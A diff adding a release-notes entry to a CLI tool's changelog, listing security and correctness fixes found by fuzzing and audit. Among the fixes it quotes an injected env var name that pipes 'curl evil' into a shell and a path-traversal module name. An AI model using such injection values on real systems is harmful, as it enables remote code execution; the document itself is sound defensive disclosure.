@@ -3,6 +3,79 @@
 User-visible changes per release. Design archaeology lives in
 `plan/`; this file is for "what's new for me".
 
+## [0.17.12] — 2026-09-01
+
+A hardening pass: a fuzzing campaign over every CLI flow (IR
+mutation, argv, env-repo eval, store/generation corruption) plus a
+full audit of all nine crates. New diagnostics E116 (module names)
+and E117 (env var names); no IR schema change.
+
+### Fixed
+
+- **`grip store verify --repair` could delete any directory on
+  disk.** The manifest's `store_path` was trusted as the delete
+  target — a tampered manifest naming, say, `~/project` turned
+  `--repair` into `rm -rf` of it. Repair now refuses anything
+  outside `$GRIPSACK_HOME/store`, and store-verify takes the apply
+  lifecycle lock so it cannot race an in-flight apply.
+- **Malformed lockfiles crashed `apply` (panic, exit 101).** A short
+  `tree256` pin sliced past its end at store-path construction. Pins
+  are validated (64-hex) when the lock is read, and a corrupt lock is
+  now a loud error on both `apply` and `update` — never a silent
+  reset to "no lock", which used to make `update` rewrite the whole
+  file and erase every other module's pin.
+- **`store verify` panicked on short manifest hashes** (exit 101);
+  tampered manifests now report cleanly, and unreadable generation
+  manifests surface as warnings instead of reading as "ok".
+- **merge mode into a non-text destination destroyed the file.** A
+  binary (or unreadable) dest was read as empty and the managed
+  block REPLACED the entire foreign file — 1 KiB of binary became
+  128 bytes of markers, silently. Deploy refuses loudly now, and
+  rollback leaves such files alone.
+- **A failed apply after `--take-over` lost your original file.**
+  The run-level rollback removed the deployed symlink but never
+  restored the captured prior — the original bytes existed only in
+  the prior blob store. Priors are restored first on rollback.
+- **Env var names reached `profile.sh` unquoted.** A name like
+  `X=; curl evil|sh #` landed raw in a file your shell sources
+  (values were quoted; names could not be). E117 rejects non-shell-
+  identifier names at eval, and the profile renderer skips them in
+  hand-edited manifests.
+- **Module names flowed into store path segments unvalidated.** A
+  name like `x/../../pwned` walked out of the store directory. E116
+  restricts names to letters, digits, `_`, `-`, `.` (no separators,
+  no `:`, no leading `.`).
+- **The GitHub enterprise token leaked to third-party hosts.**
+  `GH_ENTERPRISE_TOKEN` was attached to every request that was not
+  github.com — any module tarball URL received the credential. It
+  now binds only to the host `GH_HOST`/`GITHUB_HOST` names (the gh
+  CLI convention) and attaches nowhere when unset.
+- **Downloads that hit the 512 MiB cap were silently truncated and
+  extracted.** Hitting the cap is an error now, and xz/gz
+  decompression is capped so a compressed bomb cannot balloon in
+  RAM before the traversal scan runs.
+- **Stuck linters/plugins hung grip forever.** The NDJSON exchanges
+  enforced deadlines only between reads: a child that went silent
+  (or answered but never exited) blocked forever, a >64 KiB request
+  could deadlock both sides, and an endless line could OOM. Deadlines
+  are enforced end-to-end (kill + reap), lines cap at 1 MiB, stdin
+  is written on a writer thread, and unknown linter severities no
+  longer coerce to Error.
+- **`steps: [...]` modules bypassed the destination rules.** E102
+  (absolute/`~/` destinations) and E111 (duplicate destination)
+  walked only the declarative install/config fields; entries inside
+  step actions got neither check.
+- **Lint engine correctness.** W10 version coverage compares
+  numerically instead of by string prefix ("0.14" no longer covers
+  "0.140"); unknown `[[array-of-tables]]` sections now get A02;
+  JSON/YAML `null` reports "got null" instead of "got string"; `1`
+  matches a `1.0` choice; indented multi-char keys report real
+  columns; TOML error spans stay accurate past multibyte characters.
+- `grip update` colored its output even when piped or `NO_COLOR`
+  was set; apply writes lockfile pins as soon as fetches land (the
+  "already satisfied" early-return used to skip the write); apply
+  reads the previous manifest once instead of three times.
+
 ## [0.17.11] — 2026-08-31
 
 ### Fixed
